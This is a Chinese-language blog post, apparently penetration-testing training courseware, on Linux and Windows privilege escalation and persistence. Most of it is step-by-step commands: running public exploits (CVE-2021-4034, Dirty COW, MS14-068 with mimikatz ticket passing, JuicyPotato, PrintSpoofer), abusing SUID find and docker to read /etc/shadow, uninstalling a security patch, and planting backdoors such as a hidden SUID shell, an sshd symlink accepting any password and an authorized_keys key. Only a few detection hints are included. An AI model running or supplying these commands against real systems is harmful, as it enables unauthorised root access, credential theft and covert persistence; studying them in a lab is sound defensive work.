+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&name=day5-内网渗透基础三（下午：权限提升、权限维持）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&t=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day5-内网渗透基础三（下午：权限提升、权限维持）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E4%B8%BAroot"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">提升为root</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Polkit%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">Polkit漏洞提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.3.</span> <span class="toc-text">sudo提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83-CVE-2016-5195"><span class="toc-number">1.1.1.1.4.</span> <span class="toc-text">脏牛提权 CVE-2016-5195</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.5.</span> <span class="toc-text">docker 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">1.1.2.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ms-14-068%E6%8F%90%E5%8D%87%E4%B8%BA%E5%9F%9F%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ms-14-068提升为域管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E4%B8%BAsystem"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">提升为system</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%EF%BC%88CVE-2016-3225%EF%BC%89"><span class="toc-number">1.1.2.2.1.</span> <span class="toc-text">烂土豆提权（CVE-2016-3225）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2020-0787%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.2.2.2.</span> <span class="toc-text">CVE-2020-0787提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PrintSpoofer%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.2.2.3.</span> <span class="toc-text">PrintSpoofer提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.</span> <span class="toc-text">权限维持技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">linux权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0suid%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">添加suid后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">SSH 软连接后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">SSH 公钥免密码登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rootkit"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">Rootkit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">windows权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">影子账户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">powershell配置文件后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">映像劫持技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shift%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">shift后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">注册表自启动</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        day5-内网渗透基础三（下午：权限提升、权限维持）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-16T13:40:49.000Z" class="dt-published" itemprop="datePublished">2022-08-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%9F%B9%E8%AE%AD%E8%AF%BE%E4%BB%B6/">原创培训课件</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a>, <a class="p-category" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="tag">权限维持</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="day5-内网渗透基础三（下午：权限提升、权限维持）"><a href="#day5-内网渗透基础三（下午：权限提升、权限维持）" class="headerlink" title="day5-内网渗透基础三（下午：权限提升、权限维持）"></a>day5-内网渗透基础三（下午：权限提升、权限维持）</h1><h2 id><a href="#" class="headerlink" title></a></h2><p>权限提升</p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在 apache 就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息， ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理员权限。</p>
+<h4 id="提升为root"><a href="#提升为root" class="headerlink" title="提升为root"></a>提升为root</h4><h5 id="Polkit漏洞提权"><a href="#Polkit漏洞提权" class="headerlink" title="Polkit漏洞提权"></a>Polkit漏洞提权</h5><p>介绍</p>
+<p>Polkit（PolicyKit）是类Unix系统中一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯。pkexec是Polkit开源应用框架的一部分，可以使授权非特权用户根据定义的策略以特权用户的身份执行命令。</p>
+<p>描述：</p>
+<p>权限提升漏洞（CVE-2021-4034)是由于pkexec无法正确处理调用参数，从而将环境变量作为命令执行，具有任意用户权限的攻击者都可以在默认配置下通过修改环境变量来利用此漏洞，从而获得受影响主机的root权限</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/berdav/CVE-2021-4034.git</span></span><br><span class="line">make</span><br><span class="line">./cve-<span class="number">2021</span>-<span class="number">4034</span></span><br></pre></td></tr></table></figure>
+<p><img src="YRu6jvKNLMEufRi1Ylfr-paIwd04bg4X70sqSdaUCbo.png" alt="image"></p>
+<h5 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h5><p>SUID是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行 时，使调用者暂时获得该文件拥有者的权限。也就是如果ROOT用户给某个可执行文件加了S权限，那么 该执行程序运行的时候将拥有ROOT权限。 以下命令可以发现系统上运行的所有SUID可执行文件</p>
+<p>复现：</p>
+<p>给find添加suid</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">which find  <span class="comment">//查找find的位置</span></span><br><span class="line">chmod u+s /usr/bin/find  <span class="comment">//赋予S权限</span></span><br><span class="line">ll `which find` <span class="comment">//查看权限</span></span><br></pre></td></tr></table></figure>
+<p><img src="RWrd-pZgOxJborICdd2rVE1zuH0_-hSeLaqsVeP5wwc.png" alt="image"></p>
+<p>以下命令可以发现系统上运行的所有SUID可执行文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -user root -perm -<span class="number">4000</span>-print2&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -user root -perm -<span class="number">4000</span>-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<p><img src="sxeMddBxd1HI5vRCG8O8Cd_G7kOa7zh2pJp5yBNvMQM.png" alt="image"></p>
+<p>利用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br><span class="line">cat /etc/shadow</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<p><img src="SgrJu9sDjW_rS_kd727Eew0tx0cyWKZIZHkOIYGv1wE.png" alt="image"></p>
+<p><img src="htlJZU_TUIiM1kKAICajldgjlxr26ECgl7GjXk1Ef54.png" alt="image"></p>
+<p>常见suid提权文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</span><br></pre></td></tr></table></figure>
+<h5 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//让zhinan能够拥有root的权限</span></span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
+<p><img src="piJ3J04Cm9NvMGCL0L2ZKfsUW_RME54EtpEBOAioInc.png" alt="image"></p>
+<p><img src="5lhvmopNzbdady63TpmqRzi9O6Ln8NIjd6RpY3pbRac.png" alt="image"></p>
+<h5 id="脏牛提权-CVE-2016-5195"><a href="#脏牛提权-CVE-2016-5195" class="headerlink" title="脏牛提权 CVE-2016-5195"></a>脏牛提权 CVE-2016-5195</h5><p>脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p>
+<p>漏洞范围：Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）</p>
+<p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">git clone https:<span class="comment">//github.com/gbonacini/CVE-2016-5195.git</span></span><br><span class="line">yum -y install gcc-c++</span><br><span class="line">make</span><br><span class="line">./dcow -s</span><br></pre></td></tr></table></figure>
+<p><img src="9Qa1FSi4yr6FHnvpLX5-jGJehAjYBzaOa4NSPJStXrs.png" alt="image"></p>
+<p>准备的靶机版本较高，暂不演示</p>
+<h5 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权"></a>docker 提权</h5><p>docker是一个容器 可以在同一台机子虚拟多台服务。</p>
+<p>前提是添加在docker组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将zhinan添加到docker组</span><br><span class="line">[root<span class="meta">@localhost</span> ~]# gpasswd -a zhinan docker</span><br></pre></td></tr></table></figure>
+<p>输入命令id 和groups查询当前用户信息和组信息 发现存在docker组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">groups</span><br></pre></td></tr></table></figure>
+<p><img src="_a3RRMeh5x8CtEg009km2xKFOMBY22rdsdpINlJ_KmE.png" alt="image"></p>
+<p>下载并且运行样例alpine</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt -it alpine  <span class="comment">//运行alpine并且把宿主机所有的文件挂在到/mnt   直接进入这个容器里面</span></span><br><span class="line">cat /mnt/etc/shadow</span><br></pre></td></tr></table></figure>
+<p><img src="rmZk5B6dfW7oS6J9-WGopAJanH_esxWV8iR2FlVymLM.png" alt="image"></p>
+<p>还可以编辑宿主机的定时任务，利用定时任务给宿主机进行执行命令</p>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="ms-14-068提升为域管理"><a href="#ms-14-068提升为域管理" class="headerlink" title="ms-14-068提升为域管理"></a>ms-14-068提升为域管理</h4><p>MS14-068 是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证</p>
+<p>简单来说就是：</p>
+<p>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</p>
+<p>在请求AS时，将require_PAC设置成False。</p>
+<p>在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</p>
+<p>TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅</p>
+<p>查看补丁状况</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo|find <span class="string">&quot;KB3011780&quot;</span></span><br><span class="line">wusa /uninstall /kb:<span class="number">3011780</span> /quiet /norestart  <span class="comment">//卸载补丁</span></span><br></pre></td></tr></table></figure>
+<p><img src="S7TpkRn-gU7jFWTEM_aNg9mtvxxSti6ha90lig4YTqU.png" alt="image"></p>
+<p>获取用户名、密码、SID</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">web</span><br><span class="line">!@#Qwe456  #我所创建的用户都是这个密码，实际可用通过mimikatz获取</span><br><span class="line">S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2005268815</span>-<span class="number">658469957</span>-<span class="number">1189185684</span>-<span class="number">1103</span></span><br></pre></td></tr></table></figure>
+<p><img src="lYYsM-TNerCmpUyPXaGgYhNz8AxadDGuqVuFDAs42b0.png" alt="image"></p>
+<p>攻击</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ms14-<span class="number">068.</span>exe -u user<span class="meta">@domain</span> -p user_password -s sid -d domain_ip</span><br><span class="line">ms14-<span class="number">068.</span>exe -u web<span class="meta">@hackbox</span>.com -p !@#Qwe456 -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2005268815</span>-<span class="number">658469957</span>-<span class="number">1189185684</span>-<span class="number">1103</span> -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.149</span></span><br></pre></td></tr></table></figure>
+<p>攻击前拒绝访问，使用MS14-068.exe生成了.ccache文件</p>
+<p><img src="StakAxBSxitp2LQVMpMqZJYwDQ3r-pjuu1T4bGI5J7M.png" alt="image"></p>
+<p>使用mimikatz传递票据</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_web<span class="meta">@hackbox</span>.com.ccache</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+<p><img src="VswEIU0TjuJhiJM2xntOnat7OlLOQl4Xi7B5lbG2v4Q.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.hackbox.com\c$</span><br></pre></td></tr></table></figure>
+<h4 id="提升为system"><a href="#提升为system" class="headerlink" title="提升为system"></a>提升为system</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; <span class="number">1.</span>txt</span><br><span class="line">https:<span class="comment">//i.hacking8.com/tiquan</span></span><br></pre></td></tr></table></figure>
+<p><img src="XzmCuL2xc9BJAndE9Q4LDaCfHjMqNEYtcMOedqVD0eg.png" alt="image"></p>
+<h5 id="烂土豆提权（CVE-2016-3225）"><a href="#烂土豆提权（CVE-2016-3225）" class="headerlink" title="烂土豆提权（CVE-2016-3225）"></a>烂土豆提权（CVE-2016-3225）</h5><p>JuicyPotato_x64.exe</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato_x64.exe whoami</span><br></pre></td></tr></table></figure>
+<p><img src="g_wLL9QuKn0f-f-ACHGloCGcdiZhW3NSKynsoLy4Le0.png" alt="image"></p>
+<h5 id="CVE-2020-0787提权"><a href="#CVE-2020-0787提权" class="headerlink" title="CVE-2020-0787提权"></a>CVE-2020-0787提权</h5><p>BitsArbitraryFileMoveExploit.exe</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BitsArbitraryFileMoveExploit.exe</span><br></pre></td></tr></table></figure>
+<p><img src="FppRoqlpBoJ9G93rk0omcVc3tkCh1iy7sM-RCWf7E2o.png" alt="image"></p>
+<h5 id="PrintSpoofer提权"><a href="#PrintSpoofer提权" class="headerlink" title="PrintSpoofer提权"></a>PrintSpoofer提权</h5><p>Windows Print Spooler管理所有本地和网络打印队列，控制所有打印工作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrintSpoofer.exe -i -c whoami</span><br></pre></td></tr></table></figure>
+<p><img src="XW1MlfTq0XHeajbjGhJ07ulken0KPQ5IxErFJwR4VEM.png" alt="image"></p>
+<h2 id="权限维持技术"><a href="#权限维持技术" class="headerlink" title="权限维持技术"></a>权限维持技术</h2><h3 id="linux权限维持"><a href="#linux权限维持" class="headerlink" title="linux权限维持"></a>linux权限维持</h3><h4 id="添加suid后门"><a href="#添加suid后门" class="headerlink" title="添加suid后门"></a>添加suid后门</h4><p>当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以 root身份执行的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、SUID权限仅对二进制程序有效。</span><br><span class="line"><span class="number">2</span>、执行者对于该程序需要具有x的可执行权限</span><br><span class="line"><span class="number">3</span>、本权限仅在执行该程序的过程中有效</span><br><span class="line"><span class="number">4</span>、在执行过程中执行者将具有该程序拥有者的权限</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">创建suid权限的文件</span><br><span class="line">cp /bin/bash /tmp/.houmen</span><br><span class="line">chmod <span class="number">4755</span> /tmp/.houmen</span><br><span class="line">ls -al /tmp/.houmen</span><br></pre></td></tr></table></figure>
+<p><img src="GcObWUjXJ2oT2EKcashTXEd3AVAADioKLjjw-Bi_DWo.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmp/.houmen</span><br><span class="line">/tmp/.houmen -p <span class="comment">//bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell</span></span><br><span class="line"></span><br><span class="line">使用-p参数来获取一个root shell. 这个euid的意思是 effective user id（关于这些ID的知识，可以看：https:<span class="comment">//blog.csdn.net/fatshaw/article/details/6171035）</span></span><br></pre></td></tr></table></figure>
+<p><img src="66t4ip4UQzH-gW49FKUb4tte9foYGiNKddyx_2S993Q.png" alt="image"></p>
+<p>检测：查找具有suid权限的文件即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm +<span class="number">4000</span> -ls</span><br><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<h4 id="SSH-软连接后门"><a href="#SSH-软连接后门" class="headerlink" title="SSH 软连接后门"></a>SSH 软连接后门</h4><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过 程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=<span class="number">12345</span></span><br></pre></td></tr></table></figure>
+<p><img src="SdOEUH-NRXRhrPdNUmZk5v849Ja73VMRrrYkL7bEGRU.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span><span class="number">.88</span><span class="number">.104</span> -p <span class="number">12345</span></span><br></pre></td></tr></table></figure>
+<p><img src="B9KSXQqH9tY6fLgp1JPfWXza3MZocp4duV2auJj0iBI.png" alt="image"></p>
+<h4 id="SSH-公钥免密码登陆"><a href="#SSH-公钥免密码登陆" class="headerlink" title="SSH 公钥免密码登陆"></a>SSH 公钥免密码登陆</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa <span class="comment">//生成公钥</span></span><br><span class="line">cat id_rsa.pub &gt; authorized_keys </span><br></pre></td></tr></table></figure>
+<p><img src="FN5NaUo34gNlxzrxMYKRM8tekPJhG0Co8W76aECxWz8.png" alt="image"></p>
+<p>将id_rsa.pub内容放到目标.ssh&#x2F;authorized_keys里</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/.ssh</span><br><span class="line">chmod <span class="number">600</span> authorized_keys</span><br></pre></td></tr></table></figure>
+<p><img src="mmWgv10xaMs48lTtkKqZlLawdlq9Rmwi_dNaquYDc8Q.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@<span class="number">192.168</span><span class="number">.88</span><span class="number">.104</span></span><br></pre></td></tr></table></figure>
+<p><img src="w3YMThwUXXmxryJS_Vi7bDi-vULqjSDmEdlLewAZ2S4.png" alt="image"></p>
+<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><h4 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h4><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并 可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件 检测：使用相关检测工具，比如：unhide</p>
